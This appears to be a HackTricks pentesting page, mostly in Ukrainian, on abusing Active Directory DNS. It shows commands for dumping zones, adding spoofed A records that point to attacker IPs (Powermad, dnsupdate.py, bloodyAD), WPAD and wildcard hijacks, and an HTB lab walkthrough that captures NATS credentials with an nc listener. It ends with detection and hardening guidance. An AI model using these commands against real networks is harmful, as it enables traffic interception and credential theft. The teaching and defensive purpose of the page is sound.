# AD DNS Records

{{#include ../../banners/hacktricks-training.md}}

За замовчуванням **будь-який користувач** в Active Directory може **перерахувати всі записи DNS** у зонах DNS Domain або Forest, подібно до zone transfer (користувачі можуть перелічувати дочірні об'єкти зони DNS в AD середовищі).

Інструмент [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) дозволяє виконувати **enumeration** та **exporting** **всіх записів DNS** у зоні для recon внутрішніх мереж.
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
>  adidnsdump v1.4.0 (April 2025) додає JSON/Greppable (`--json`) вивід, багатопотокове DNS-розв'язування та підтримку TLS 1.2/1.3 при прив'язці до LDAPS

For more information read [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

---

## Створення / модифікація записів (ADIDNS spoofing)

Оскільки група **Authenticated Users** за замовчуванням має **Create Child** на zone DACL, будь-який доменний обліковий запис (або обліковий запис комп'ютера) може зареєструвати додаткові записи. Це може бути використано для traffic hijacking, NTLM relay coercion або навіть full domain compromise.

### PowerMad / Invoke-DNSUpdate (PowerShell)
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
*(dnsupdate.py входить до складу Impacket ≥0.12.0)*

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## Типові примітиви атак

1. **Wildcard record** – `*.<zone>` перетворює AD DNS server на відгукувач по всій організації, схожий на LLMNR/NBNS spoofing. Це можна використати для перехоплення NTLM hashes або їх relay до LDAP/SMB. (Потребує вимкнення WINS-lookup.)
2. **WPAD hijack** – додайте `wpad` (або **NS** запис, що вказує на хост атакувальника для обходу Global-Query-Block-List) і прозоро проксувати вихідні HTTP-запити для збору облікових даних. Microsoft виправила wildcard/DNAME bypasses (CVE-2018-8320), але **NS-records still work**.
3. **Stale entry takeover** – захопіть IP-адресу, що раніше належала робочій станції, і пов’язаний DNS-запис усе ще буде резолвитись, що дозволяє використовувати resource-based constrained delegation або Shadow-Credentials атаки без будь-яких змін у DNS.
4. **DHCP → DNS spoofing** – на типовому розгортанні Windows DHCP+DNS неаутентифікований атакувальник в тій же підмережі може перезаписати будь-який існуючий A record (включно з Domain Controllers), відправивши підроблені DHCP-запити, що викликають dynamic DNS updates (Akamai “DDSpoof”, 2023). Це дає machine-in-the-middle над Kerberos/LDAP і може призвести до повного takeover домену.
5. **Certifried (CVE-2022-26923)** – змініть `dNSHostName` облікового запису машини, яку ви контролюєте, зареєструйте відповідний A record, а потім запросіть сертифікат для цього імені, щоб імітувати DC. Інструменти як **Certipy** або **BloodyAD** повністю автоматизують цей процес.

---

### Перехоплення внутрішнього сервісу через stale dynamic records (NATS case study)

Коли dynamic updates залишаються доступними для всіх аутентифікованих користувачів, **de-registered service name можна повторно претендувати й вказати на інфраструктуру атакувальника**. Mirage HTB DC виставив hostname `nats-svc.mirage.htb` після DNS scavenging, тому будь-який користувач з низькими привілеями міг:

1. **Переконатися, що запис відсутній** і дізнатися SOA за допомогою `dig`:
```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```
2. **Повторно створити запис** до зовнішнього/VPN інтерфейсу, який вони контролюють:
```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```
3. **Імітуйте сервіс у відкритому тексті**. Клієнти NATS очікують побачити один `INFO { ... }` банер перед тим, як відправляти облікові дані, тому копіювання легітимного банера від реального брокера достатнє для збору секретів:
```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```
Any client that resolves the hijacked name will immediately leak its JSON `CONNECT` frame (including `"user"`/`"pass"`) to the listener. Running the official `nats-server -V` binary on the attacker host, disabling its log redaction, or just sniffing the session with Wireshark yields the same plaintext credentials because TLS was optional.

4. **Pivot with the captured creds** – у Mirage вкрадений акаунт NATS надав доступ до JetStream, що відкрив історичні події автентифікації, які містили багаторазово використовувані AD імена користувачів/паролі.

This pattern applies to every AD-integrated service that relies on unsecured TCP handshakes (HTTP APIs, RPC, MQTT, etc.): once the DNS record is hijacked, the attacker becomes the service.

---

## Виявлення та захист

* Deny **Authenticated Users** the *Create all child objects* right on sensitive zones and delegate dynamic updates to a dedicated account used by DHCP.
* If dynamic updates are required, set the zone to **Secure-only** and enable **Name Protection** in DHCP so that only the owner computer object can overwrite its own record.
* Monitor DNS Server event IDs 257/252 (dynamic update), 770 (zone transfer) and LDAP writes to `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Block dangerous names (`wpad`, `isatap`, `*`) with an intentionally-benign record or via the Global Query Block List.
* Keep DNS servers patched – e.g., RCE bugs CVE-2024-26224 and CVE-2024-26231 reached **CVSS 9.8** and are remotely exploitable against Domain Controllers.



## References

- Kevin Robertson – “ADIDNS Revisited – WPAD, GQBL and More”  (2018, все ще фактично еталон для wildcard/WPAD атак)
- Akamai – “Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates” (Dec 2023)
- [HackTheBox Mirage: Chaining NFS Leaks, Dynamic DNS Abuse, NATS Credential Theft, JetStream Secrets, and Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
{{#include ../../banners/hacktricks-training.md}}
